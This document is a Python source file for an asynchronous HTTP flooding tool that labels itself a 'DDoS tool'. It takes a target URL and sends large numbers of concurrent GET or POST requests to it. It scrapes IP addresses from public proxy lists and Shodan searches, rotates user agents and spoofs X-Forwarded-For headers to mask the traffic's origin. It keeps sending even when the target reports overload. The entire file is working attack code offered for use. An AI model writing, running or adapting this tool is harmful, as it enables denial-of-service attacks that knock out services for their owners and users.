import asyncio  
import aiohttp  
import random  
import re  
import itertools  
import argparse  
from colorama import Fore  
  
def parse_args():  
    parser = argparse.ArgumentParser(description="DDoS tool")  
    parser.add_argument('-u', '--url', type=str, required=True, help="Target URL for the DDoS attack.")  
    parser.add_argument('-r', '--requests', type=int, required=True, help="Number of requests to send.")  
    parser.add_argument('-m', '--method', type=str, choices=['GET', 'POST'], required=False, help="HTTP method to use (GET or POST).")  
    parser.add_argument('--fast', action='store_true', help="Use fast mode with more parallel requests.")  
    parser.add_argument('--slow', action='store_true', help="Use slow mode with fewer parallel requests.")  
    parser.add_argument('--proxy', type=str, help="Use one specific proxy to send requests from.")  
    parser.add_argument('-refer', '--refer', type=str, help="Custom Referer to send in the request. --refer """" "Your message" """)  
    return parser.parse_args()  
  
ip_list_urls = [  
    "https://www.us-proxy.org",  
    "https://www.socks-proxy.net",  
    "https://proxyscrape.com/free-proxy-list",  
    "https://www.proxynova.com/proxy-server-list/",  
    "https://proxybros.com/free-proxy-list/",  
    "https://proxydb.net/",  
    "https://spys.one/en/free-proxy-list/",  
    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1#google_vignette",  
    "https://hasdata.com/free-proxy-list",  
    "https://www.proxyrack.com/free-proxy-list/",  
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",  
    "https://www.shodan.io/search?query=brazil",  
    "https://www.shodan.io/search?query=germany",  
    "https://www.shodan.io/search?query=france",  
    "https://www.shodan.io/search?query=USA",  
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",  
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",  
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",  
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",  
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",  
]  
  
UserAgents = [  
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",  
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",  
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",  
]  
  
async def fetch_ip_addresses(url):  
    async with aiohttp.ClientSession() as session:  
        try:  
            async with session.get(url) as response:  
                text = await response.text()  
                ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)  
                return ip_addresses  
        except Exception as e:  
            return []  
  
async def get_all_ips():  
    tasks = [fetch_ip_addresses(url) for url in ip_list_urls]  
    ip_lists = await asyncio.gather(*tasks)  
    all_ips = [ip for sublist in ip_lists for ip in sublist]  
    print(f"Total Proxies fetched: {len(all_ips)}")  
    return all_ips  
  
async def send_request(session, proxy, method, url, semaphore, referer=None):  
    headers = {  
        "User-Agent": random.choice(UserAgents),  
        "X-Forwarded-For": proxy,  
    }  
    if referer:  
        headers["Referer"] = referer  
    try:  
        async with semaphore:  
            if method == 'GET':  
                async with session.get(url, headers=headers) as response:  
                    if response.status in [508, 408, 503]:  
                        print(Fore.LIGHTBLACK_EX + f"Received status code {response.status} from {url}. Continuing the attack...")  
                        print(Fore.WHITE)  
                    else:  
                        print(Fore.LIGHTBLACK_EX + Fore.WHITE + f"DDoS {url} from Proxy: {proxy} - Status Code: {response.status}")  
            elif method == 'POST':  
                async with session.post(url, headers=headers) as response:  
                    if response.status in [508, 408, 503]:  
                        print(Fore.LIGHTBLACK_EX + f"Received status code {response.status} from {url}. Continuing the attack...")  
                        print(Fore.WHITE)  
                    else:  
                        print(Fore.LIGHTBLACK_EX + Fore.WHITE + f"DDoS{url} from Proxy: {proxy} - Status Code: {response.status}")  
    except Exception as e:  
        print(f"Error sending request from Proxy: {proxy} - {e}")  
  
async def main():  
    args = parse_args()  
  
    if args.fast:  
        semaphore = asyncio.Semaphore(10000)  
    elif args.slow:  
        semaphore = asyncio.Semaphore(100)  
    else:  
        semaphore = asyncio.Semaphore(500)  
  
    if args.proxy:  
        ip_list = [args.proxy]  
        num_requests = args.requests  
        ip_cycle = itertools.cycle(ip_list)  
    else:  
        ip_list = await get_all_ips()  
        num_requests = min(args.requests, len(ip_list))  
        ip_cycle = itertools.cycle(ip_list)  
  
    async with aiohttp.ClientSession() as session:  
        tasks = []  
        for _ in range(num_requests):  
            tasks.append(send_request(session, next(ip_cycle), args.method, args.url, semaphore, args.refer))  
        await asyncio.gather(*tasks)  
  
if __name__ == "__main__":  
    asyncio.run(main())
